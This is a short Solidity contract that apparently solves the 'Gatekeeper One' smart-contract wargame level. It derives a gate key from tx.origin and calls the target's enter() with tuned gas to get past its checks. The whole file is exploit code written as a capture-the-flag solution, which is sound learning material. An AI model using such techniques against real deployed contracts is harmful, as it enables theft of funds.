// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Target {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {
    function attack(address targetAddress, uint gas) public {
        Target target = Target(targetAddress);
        bytes8 gateKey = bytes8(
            uint64(1 << 63) + uint64(uint16(uint160(tx.origin)))
        );

        target.enter{gas: 819100 + gas}(gateKey);
    }
}
